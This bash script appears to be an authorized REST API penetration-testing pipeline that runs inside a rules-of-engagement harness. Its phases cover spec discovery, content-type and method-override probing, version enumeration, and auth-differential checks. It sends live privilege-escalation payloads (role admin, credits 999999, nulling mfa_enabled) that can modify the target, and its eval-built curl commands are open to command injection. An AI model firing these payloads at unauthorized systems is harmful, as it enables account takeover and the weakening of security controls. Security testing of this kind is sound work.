#!/usr/bin/env bash
# =============================================================================
# rest-api-test.sh - Full REST API Security Testing Pipeline
# =============================================================================
# End-to-end REST API testing covering:
#   Phase 1: OpenAPI/Swagger spec discovery
#   Phase 2: Spec analysis (calls spec-analyzer.sh if spec found)
#   Phase 3: Content-Type negotiation testing
#   Phase 4: HTTP method enumeration + override header testing
#   Phase 5: API version enumeration + response diffing
#   Phase 6: Mass assignment testing (PUT/PATCH/JSON Patch/Merge Patch)
#   Phase 7: Response differential analysis (auth levels)
#   Phase 8: Summary report generation
#
# Usage:
#   ./rest-api-test.sh <target-base-url> [options]
#
# Options:
#   --token <token>        Bearer token for User A (primary)
#   --token-b <token>      Bearer token for User B (for BOLA testing)
#   --endpoints <file>     Pre-discovered endpoints file (skip discovery)
#   --spec <url-or-file>   Known spec location (skip spec discovery)
#   --phase <phase>        Run specific phase: discover|content-type|methods|
#                          versioning|mass-assignment|response-diff|all
#   --proxy <url>          Route traffic through proxy (e.g., http://127.0.0.1:8080)
#   --rate <n>             Delay between requests in seconds (default: 0.2)
#   --output-dir <dir>     Output directory (default: reports/rest-api)
#   --skip-waf-check       Skip WAF detection step
#   --generate-scripts     Pass through to spec-analyzer for script generation
#
# Requirements: curl, jq, ffuf, arjun (optional), wafw00f (optional)
# =============================================================================
set -euo pipefail

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

usage() {
  echo "Usage: $0 <target-base-url> [options]"
  echo ""
  echo "Options:"
  echo "  --token <token>        Bearer token (User A)"
  echo "  --token-b <token>      Bearer token (User B) for BOLA"
  echo "  --endpoints <file>     Pre-discovered endpoints file"
  echo "  --spec <url-or-file>   Known spec location"
  echo "  --phase <phase>        Run specific phase (discover|content-type|methods|versioning|mass-assignment|response-diff|all)"
  echo "  --proxy <url>          Proxy URL (e.g., http://127.0.0.1:8080)"
  echo "  --rate <n>             Delay between requests in seconds (default: 0.2)"
  echo "  --output-dir <dir>     Output directory (default: reports/rest-api)"
  echo "  --skip-waf-check       Skip WAF detection"
  echo "  --generate-scripts     Generate test scripts from spec analysis"
  exit 1
}

log() { echo -e "${CYAN}[REST-API-TEST]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
hit() { echo -e "${RED}[FINDING]${NC} $1"; }
ok() { echo -e "${GREEN}[+]${NC} $1"; }
header() { echo -e "\n${BOLD}=== $1 ===${NC}"; }

# ---- Argument Parsing ----
TARGET="${1:-}"
[ -z "$TARGET" ] && usage
TARGET="${TARGET%/}"

shift
TOKEN=""; TOKEN_B=""; ENDPOINTS_FILE=""; SPEC_SOURCE=""
PHASE="all"; PROXY=""; RATE="0.2"; OUT="reports/rest-api"
SKIP_WAF=false; GEN_SCRIPTS=""

while [[ $# -gt 0 ]]; do
  case $1 in
    --token) TOKEN="$2"; shift 2 ;;
    --token-b) TOKEN_B="$2"; shift 2 ;;
    --endpoints) ENDPOINTS_FILE="$2"; shift 2 ;;
    --spec) SPEC_SOURCE="$2"; shift 2 ;;
    --phase) PHASE="$2"; shift 2 ;;
    --proxy) PROXY="$2"; shift 2 ;;
    --rate) RATE="$2"; shift 2 ;;
    --output-dir) OUT="$2"; shift 2 ;;
    --skip-waf-check) SKIP_WAF=true; shift ;;
    --generate-scripts) GEN_SCRIPTS="--generate-scripts"; shift ;;
    *) echo -e "${RED}[ERROR]${NC} Unknown: $1"; usage ;;
  esac
done

# Egress: all of this script's curl/ffuf/wafw00f traffic reaches the target. The program's egress
# proxy (roe.json "proxy" / GRIMNIR_PROXY, exported by the calling harness) carries it and overrides any
# explicit --proxy; an unusable proxy refuses the run (exit 4). The effective PROXY flows into both
# CURL_OPTS and the ffuf -x below. No project dir here -> egress_init reads GRIMNIR_PROXY from env.
source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/../../scripts/egress-env.sh"
egress_init "" || exit 4
PROXY="$(egress_effective_proxy "$PROXY")"

mkdir -p "$OUT"/{spec,content-type,methods,versioning,mass-assignment,response-diff}

CURL_OPTS="-s --connect-timeout 10 --max-time 30"
[ -n "$PROXY" ] && CURL_OPTS="$CURL_OPTS -x $PROXY"
AUTH_HEADER=""
[ -n "$TOKEN" ] && AUTH_HEADER="-H \"Authorization: Bearer $TOKEN\""

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TIMESTAMP=$(date +"%Y%m%d-%H%M%S")
FINDINGS_FILE="$OUT/findings-$TIMESTAMP.md"
FINDING_COUNT=0

add_finding() {
  local severity="$1" title="$2" endpoint="$3" detail="$4"
  FINDING_COUNT=$((FINDING_COUNT + 1))
  cat >> "$FINDINGS_FILE" << FINDING

## [$severity] $title

**Endpoint**: $endpoint
**Evidence**: $detail

FINDING
  hit "$severity: $title - $endpoint"
}

# ---- WAF Check ----
run_waf_check() {
  if [ "$SKIP_WAF" = true ]; then
    warn "WAF check skipped"
    return
  fi
  header "WAF Detection"
  if command -v wafw00f >/dev/null 2>&1; then
    log "Running wafw00f against $TARGET..."
    wafw00f "$TARGET" -o "$OUT/waf-result.json" -f json 2>/dev/null || true
    WAF_DETECTED=$(cat "$OUT/waf-result.json" 2>/dev/null | jq -r '.[0].firewall // "None"' 2>/dev/null || echo "Unknown")
    if [ "$WAF_DETECTED" != "None" ] && [ "$WAF_DETECTED" != "null" ]; then
      warn "WAF Detected: $WAF_DETECTED - adjusting to conservative testing"
    else
      ok "No WAF detected"
    fi
  else
    warn "wafw00f not installed - skipping WAF detection"
  fi
}

# ---- Phase 1: Spec Discovery ----
run_discover() {
  header "Phase 1: OpenAPI/Swagger Spec Discovery"

  if [ -n "$SPEC_SOURCE" ]; then
    ok "Using provided spec: $SPEC_SOURCE"
    return
  fi

  WORDLIST="wordlists/openapi-paths.txt"
  [ ! -f "$WORDLIST" ] && WORDLIST="$(dirname "$SCRIPT_DIR")/wordlists/openapi-paths.txt"

  if [ -f "$WORDLIST" ] && command -v ffuf >/dev/null 2>&1; then
    log "Fuzzing for spec endpoints with ffuf..."
    FFUF_PROXY=""
    [ -n "$PROXY" ] && FFUF_PROXY="-x $PROXY"
    ffuf -w "$WORDLIST" -u "$TARGET/FUZZ" -mc 200 -t 10 $FFUF_PROXY \
      -o "$OUT/spec/discovery-ffuf.json" -of json 2>/dev/null || true

    # Extract found URLs
    FOUND_SPECS=$(jq -r '.results[]?.url // empty' "$OUT/spec/discovery-ffuf.json" 2>/dev/null || true)
    if [ -n "$FOUND_SPECS" ]; then
      echo "$FOUND_SPECS" > "$OUT/spec/found-specs.txt"
      SPEC_SOURCE=$(echo "$FOUND_SPECS" | head -1)
      ok "Found spec(s):"
      echo "$FOUND_SPECS" | while read url; do ok "  $url"; done
    else
      warn "No specs found via fuzzing"
    fi
  else
    log "Manual spec check (ffuf or wordlist not available)..."
    for path in openapi.json swagger.json api-docs api/swagger.json api/openapi.json; do
      code=$(eval curl $CURL_OPTS -o /dev/null -w "%{http_code}" "$TARGET/$path" 2>/dev/null || echo "000")
      if [ "$code" = "200" ]; then
        SPEC_SOURCE="$TARGET/$path"
        ok "Found: $SPEC_SOURCE"
        break
      fi
    done
    [ -z "$SPEC_SOURCE" ] && warn "No spec found"
  fi

  # Run spec-analyzer if spec was found
  if [ -n "$SPEC_SOURCE" ] && [ -f "$SCRIPT_DIR/spec-analyzer.sh" ]; then
    log "Running spec-analyzer on $SPEC_SOURCE..."
    bash "$SCRIPT_DIR/spec-analyzer.sh" "$SPEC_SOURCE" \
      --output-dir "$OUT/spec" --target "$TARGET" \
      ${TOKEN:+--token "$TOKEN"} $GEN_SCRIPTS || true
  fi
}

# ---- Phase 3: Content-Type Testing ----
run_content_type() {
  header "Phase 3: Content-Type Negotiation Testing"

  # Get test endpoints (writable preferred)
  local test_endpoints="$OUT/spec/writable-endpoints.txt"
  [ ! -f "$test_endpoints" ] && test_endpoints="$ENDPOINTS_FILE"
  [ -z "$test_endpoints" ] || [ ! -f "$test_endpoints" ] && {
    warn "No endpoints file - testing against target root"
    echo "POST $TARGET/api/" > "$OUT/content-type/test-targets.txt"
    test_endpoints="$OUT/content-type/test-targets.txt"
  }

  CT_WORDLIST="wordlists/content-types.txt"
  [ ! -f "$CT_WORDLIST" ] && CT_WORDLIST="$(dirname "$SCRIPT_DIR")/wordlists/content-types.txt"

  if [ ! -f "$CT_WORDLIST" ]; then
    printf "application/json\napplication/xml\napplication/x-www-form-urlencoded\ntext/plain\napplication/json;charset=utf-7\napplication/vnd.api+json\napplication/json-patch+json\napplication/merge-patch+json\n" > "$OUT/content-type/content-types.txt"
    CT_WORDLIST="$OUT/content-type/content-types.txt"
  fi

  head -5 "$test_endpoints" 2>/dev/null | while IFS= read -r line; do
    method=$(echo "$line" | awk '{print $1}')
    path=$(echo "$line" | awk '{print $2}')
    url="$TARGET$path"

    log "Testing content-types on $method $path..."
    while IFS= read -r ct; do
      [ -z "$ct" ] && continue
      resp=$(eval curl $CURL_OPTS -o /tmp/ct-resp.txt -w "%{http_code}:%{size_download}" \
        -X "$method" "\"$url\"" \
        -H "\"Content-Type: $ct\"" $AUTH_HEADER \
        -d "'{\"test\":\"value\"}'" 2>/dev/null || echo "000:0")
      code=$(echo "$resp" | cut -d: -f1)
      size=$(echo "$resp" | cut -d: -f2)
      echo "$ct | $code | ${size}b" >> "$OUT/content-type/${method}-$(echo "$path" | tr '/' '_').txt"

      # Flag interesting responses
      if [ "$code" = "200" ] && echo "$ct" | grep -qi "xml"; then
        add_finding "MEDIUM" "Endpoint accepts XML (XXE potential)" "$method $path" "Content-Type: $ct returned $code"
      fi
      if [ "$code" = "200" ] && echo "$ct" | grep -qi "text/plain"; then
        add_finding "LOW" "Endpoint accepts text/plain (CORS simple request bypass)" "$method $path" "Content-Type: $ct returned $code"
      fi
      sleep "$RATE"
    done < "$CT_WORDLIST"
  done
  ok "Content-type results saved to $OUT/content-type/"
}

# ---- Phase 4: Method Enumeration ----
run_methods() {
  header "Phase 4: HTTP Method Enumeration"

  local test_endpoints="$OUT/spec/all-endpoints.txt"
  [ ! -f "$test_endpoints" ] && test_endpoints="$ENDPOINTS_FILE"
  [ -z "$test_endpoints" ] || [ ! -f "$test_endpoints" ] && {
    warn "No endpoints available for method testing"
    return
  }

  # Get unique paths (test each path with all methods)
  awk '{print $2}' "$test_endpoints" | sort -u | head -20 | while IFS= read -r path; do
    url="$TARGET$path"
    log "Method enum: $path"
    for method in GET POST PUT PATCH DELETE HEAD OPTIONS TRACE; do
      code=$(eval curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X "$method" "\"$url\"" $AUTH_HEADER 2>/dev/null || echo "000")
      echo "$method: $code" >> "$OUT/methods/$(echo "$path" | tr '/' '_').txt"

      # Flag unexpected successes
      if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
        # Check if this method is documented
        if ! grep -q "^$method $path" "$test_endpoints" 2>/dev/null; then
          add_finding "MEDIUM" "Undocumented HTTP method accepted" "$method $path" "Returned $code but not in spec"
        fi
      fi
      sleep "$RATE"
    done

    # Test method override headers
    for override_header in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do
      for override_method in PUT DELETE PATCH; do
        code=$(eval curl $CURL_OPTS -o /dev/null -w "%{http_code}" -X POST "\"$url\"" \
          -H "\"$override_header: $override_method\"" $AUTH_HEADER 2>/dev/null || echo "000")
        if [ "$code" = "200" ] || [ "$code" = "201" ] || [ "$code" = "204" ]; then
          add_finding "HIGH" "Method override header accepted" "POST $path ($override_header: $override_method)" "Override returned $code"
          echo "$override_header: $override_method -> $code" >> "$OUT/methods/overrides.txt"
        fi
        sleep "$RATE"
      done
    done
  done
  ok "Method enumeration saved to $OUT/methods/"
}

# ---- Phase 5: API Version Testing ----
run_versioning() {
  header "Phase 5: API Version Enumeration"

  VER_WORDLIST="wordlists/api-versions.txt"
  [ ! -f "$VER_WORDLIST" ] && VER_WORDLIST="$(dirname "$SCRIPT_DIR")/wordlists/api-versions.txt"
  [ ! -f "$VER_WORDLIST" ] && {
    printf "v0\nv1\nv2\nv3\nv4\nv5\napi/v1\napi/v2\napi/v3\n" > "$OUT/versioning/versions.txt"
    VER_WORDLIST="$OUT/versioning/versions.txt"
  }

  # Test a known good endpoint with different versions
  TEST_PATH="/users/me"
  if [ -f "$OUT/spec/all-endpoints.txt" ]; then
    TEST_PATH=$(grep "^GET" "$OUT/spec/all-endpoints.txt" | head -1 | awk '{print $2}' | sed 's/{[^}]*}/1/g')
  fi

  log "Testing version paths against $TEST_PATH..."
  while IFS= read -r version; do
    [ -z "$version" ] && continue
    url="$TARGET/$version$(echo "$TEST_PATH" | sed 's|^/api||')"
    resp=$(eval curl $CURL_OPTS -o "/tmp/ver-resp-$(echo "$version" | tr '/' '-').json" \
      -w "%{http_code}:%{size_download}" "\"$url\"" $AUTH_HEADER 2>/dev/null || echo "000:0")
    code=$(echo "$resp" | cut -d: -f1)
    size=$(echo "$resp" | cut -d: -f2)
    echo "$version | $code | ${size}b" >> "$OUT/versioning/version-results.txt"
    if [ "$code" = "200" ]; then
      ok "Accessible: $version ($code, ${size}b)"
    fi
    sleep "$RATE"
  done < "$VER_WORDLIST"

  # Header-based versioning
  log "Testing header-based versioning..."
  for v in 1 2 3 "2021-01-01" "2022-01-01" "2023-01-01" "2024-01-01" "2025-01-01"; do
    for header_name in "Api-Version" "X-API-Version" "X-Api-Version" "api-version"; do
      url="$TARGET$TEST_PATH"
      code=$(eval curl $CURL_OPTS -o /dev/null -w "%{http_code}" "\"$url\"" \
        -H "\"$header_name: $v\"" $AUTH_HEADER 2>/dev/null || echo "000")
      if [ "$code" = "200" ]; then
        echo "$header_name: $v | $code" >> "$OUT/versioning/header-versions.txt"
      fi
      sleep "$RATE"
    done
  done

  # Diff responses between accessible versions
  log "Diffing responses between accessible versions..."
  local prev_file=""
  for f in /tmp/ver-resp-*.json; do
    [ ! -s "$f" ] && continue
    if [ -n "$prev_file" ] && [ -s "$prev_file" ]; then
      diff_result=$(diff <(jq -S . "$prev_file" 2>/dev/null || cat "$prev_file") \
                         <(jq -S . "$f" 2>/dev/null || cat "$f") 2>/dev/null || true)
      if [ -n "$diff_result" ]; then
        basename_prev=$(basename "$prev_file" .json)
        basename_curr=$(basename "$f" .json)
        echo "--- $basename_prev vs $basename_curr ---" >> "$OUT/versioning/version-diffs.txt"
        echo "$diff_result" >> "$OUT/versioning/version-diffs.txt"
        echo "" >> "$OUT/versioning/version-diffs.txt"
      fi
    fi
    prev_file="$f"
  done
  ok "Version testing saved to $OUT/versioning/"
}

# ---- Phase 6: Mass Assignment ----
run_mass_assignment() {
  header "Phase 6: Mass Assignment Testing"

  local test_endpoints="$OUT/spec/writable-endpoints.txt"
  [ ! -f "$test_endpoints" ] && {
    warn "No writable endpoints identified - using discovered endpoints"
    if [ -f "$OUT/spec/all-endpoints.txt" ]; then
      grep -E '^(POST|PUT|PATCH)' "$OUT/spec/all-endpoints.txt" > "$OUT/mass-assignment/writable.txt" 2>/dev/null || true
      test_endpoints="$OUT/mass-assignment/writable.txt"
    else
      warn "No endpoints available for mass assignment testing"
      return
    fi
  }

  MASS_FIELDS="wordlists/mass-assignment-fields.txt"
  [ ! -f "$MASS_FIELDS" ] && MASS_FIELDS="$(dirname "$SCRIPT_DIR")/wordlists/mass-assignment-fields.txt"

  head -10 "$test_endpoints" 2>/dev/null | while IFS= read -r line; do
    method=$(echo "$line" | awk '{print $1}')
    path=$(echo "$line" | awk '{print $2}')
    url="$TARGET$(echo "$path" | sed 's/{[^}]*}/1/g')"
    log "Mass assignment: $method $path"

    # Step 1: GET to see current fields
    baseline=$(eval curl $CURL_OPTS "\"$url\"" $AUTH_HEADER 2>/dev/null || echo "{}")
    baseline_keys=$(echo "$baseline" | jq -r 'keys[]' 2>/dev/null || true)

    # Step 2: Standard JSON mass assignment
    PAYLOAD='{"role":"admin","is_admin":true,"isAdmin":true,"admin":true,"verified":true,"email_verified":true,"permissions":["*"],"tier":"enterprise","credits":999999,"balance":999999}'
    resp=$(eval curl $CURL_OPTS -o /tmp/mass-resp.json -w "%{http_code}" \
      -X PUT "\"$url\"" $AUTH_HEADER \
      -H "\"Content-Type: application/json\"" -d "'$PAYLOAD'" 2>/dev/null || echo "000")
    if [ "$resp" = "200" ]; then
      new_keys=$(jq -r 'keys[]' /tmp/mass-resp.json 2>/dev/null || true)
      add_finding "HIGH" "PUT mass assignment may be possible" "PUT $path" "Returned $resp with privesc payload"
    fi

    # Step 3: JSON Patch format
    resp=$(eval curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
      -X PATCH "\"$url\"" $AUTH_HEADER \
      -H "\"Content-Type: application/json-patch+json\"" \
      -d "'[{\"op\":\"replace\",\"path\":\"/role\",\"value\":\"admin\"},{\"op\":\"add\",\"path\":\"/is_admin\",\"value\":true}]'" 2>/dev/null || echo "000")
    if [ "$resp" = "200" ]; then
      add_finding "HIGH" "JSON Patch (RFC 6902) accepted" "PATCH $path" "application/json-patch+json returned $resp"
    fi

    # Step 4: Merge Patch null deletion
    resp=$(eval curl $CURL_OPTS -o /dev/null -w "%{http_code}" \
      -X PATCH "\"$url\"" $AUTH_HEADER \
      -H "\"Content-Type: application/merge-patch+json\"" \
      -d "'{\"mfa_enabled\":null,\"password_reset_required\":null,\"locked\":null}'" 2>/dev/null || echo "000")
    if [ "$resp" = "200" ]; then
      add_finding "HIGH" "Merge Patch null deletion accepted (may disable security controls)" "PATCH $path" "application/merge-patch+json with null fields returned $resp"
    fi

    sleep "$RATE"
  done
  ok "Mass assignment results saved to $OUT/mass-assignment/"
}

# ---- Phase 7: Response Differential ----
run_response_diff() {
  header "Phase 7: Response Differential Analysis"

  [ -z "$TOKEN" ] && { warn "No token provided - skipping response diff"; return; }

  local test_endpoints="$OUT/spec/all-endpoints.txt"
  [ ! -f "$test_endpoints" ] && { warn "No endpoints for response diff"; return; }

  grep "^GET" "$test_endpoints" | head -10 | while IFS= read -r line; do
    path=$(echo "$line" | awk '{print $2}')
    url="$TARGET$(echo "$path" | sed 's/{[^}]*}/1/g')"
    safe_name=$(echo "$path" | tr '/' '_')
    log "Response diff: GET $path"

    # Authenticated response
    eval curl $CURL_OPTS "\"$url\"" -H "\"Authorization: Bearer $TOKEN\"" > "/tmp/resp-auth-$safe_name.json" 2>/dev/null || true

    # Unauthenticated response
    eval curl $CURL_OPTS "\"$url\"" > "/tmp/resp-noauth-$safe_name.json" 2>/dev/null || true

    # Second user (if provided)
    if [ -n "$TOKEN_B" ]; then
      eval curl $CURL_OPTS "\"$url\"" -H "\"Authorization: Bearer $TOKEN_B\"" > "/tmp/resp-userb-$safe_name.json" 2>/dev/null || true
    fi

    # Compare auth vs noauth
    auth_fields=$(jq 'keys | length' "/tmp/resp-auth-$safe_name.json" 2>/dev/null || echo "0")
    noauth_fields=$(jq 'keys | length' "/tmp/resp-noauth-$safe_name.json" 2>/dev/null || echo "0")

    if [ "$noauth_fields" -gt 0 ] && [ "$noauth_fields" -ge "$auth_fields" ] 2>/dev/null; then
      add_finding "HIGH" "Endpoint accessible without authentication" "GET $path" "Unauth: ${noauth_fields} fields, Auth: ${auth_fields} fields"
    fi

    {
      echo "--- GET $path ---"
      echo "Auth fields: $auth_fields | NoAuth fields: $noauth_fields"
      diff <(jq -S . "/tmp/resp-auth-$safe_name.json" 2>/dev/null) \
           <(jq -S . "/tmp/resp-noauth-$safe_name.json" 2>/dev/null) 2>/dev/null || true
      echo ""
    } >> "$OUT/response-diff/diff-results.txt"

    sleep "$RATE"
  done
  ok "Response diff results saved to $OUT/response-diff/"
}

# ---- Phase 8: Report ----
generate_report() {
  header "Phase 8: Generating Summary Report"

  cat > "$OUT/summary-$TIMESTAMP.md" << REPORTEOF
# REST API Security Test Report

**Target**: $TARGET
**Date**: $(date -u +"%Y-%m-%d %H:%M:%S UTC")
**Findings**: $FINDING_COUNT

## Configuration
- Token A: ${TOKEN:+provided}${TOKEN:-not provided}
- Token B: ${TOKEN_B:+provided}${TOKEN_B:-not provided}
- Proxy: ${PROXY:-none}
- Rate: ${RATE}s delay
- Phases: $PHASE

## Findings Summary

$(cat "$FINDINGS_FILE" 2>/dev/null || echo "No findings recorded.")

## Files Generated

\`\`\`
$(find "$OUT" -type f -name "*.txt" -o -name "*.json" -o -name "*.md" | sort)
\`\`\`

## Recommendations

1. Review all findings and validate in target context
2. Test BOLA candidates with two authenticated user sessions
3. Investigate any undocumented methods or endpoints
4. Check mass assignment results for actual privilege changes
5. Verify response differential results for data leakage
REPORTEOF

  ok "Report: $OUT/summary-$TIMESTAMP.md"
}

# ---- Main Execution ----
echo -e "${BOLD}================================================================${NC}"
echo -e "${BOLD} REST API Security Testing Pipeline${NC}"
echo -e "${BOLD} Target: $TARGET${NC}"
echo -e "${BOLD} Phase:  $PHASE${NC}"
echo -e "${BOLD} Time:   $(date)${NC}"
echo -e "${BOLD}================================================================${NC}"

# Initialize findings file
cat > "$FINDINGS_FILE" << FHEADER
# REST API Security Findings
**Target**: $TARGET
**Date**: $(date -u +"%Y-%m-%d %H:%M:%S UTC")

---
FHEADER

run_waf_check

case "$PHASE" in
  discover)        run_discover ;;
  content-type)    run_content_type ;;
  methods)         run_methods ;;
  versioning)      run_versioning ;;
  mass-assignment) run_mass_assignment ;;
  response-diff)   run_response_diff ;;
  all)
    run_discover
    run_content_type
    run_methods
    run_versioning
    run_mass_assignment
    run_response_diff
    ;;
  *) echo -e "${RED}[ERROR]${NC} Unknown phase: $PHASE"; usage ;;
esac

generate_report

echo ""
echo -e "${BOLD}================================================================${NC}"
echo -e "${BOLD} REST API Test Complete${NC}"
echo -e "${BOLD}================================================================${NC}"
echo -e " Target:   $TARGET"
echo -e " Findings: ${RED}$FINDING_COUNT${NC}"
echo -e " Output:   $OUT/"
echo -e " Report:   $OUT/summary-$TIMESTAMP.md"
echo -e " Findings: $FINDINGS_FILE"
echo -e "${BOLD}================================================================${NC}"
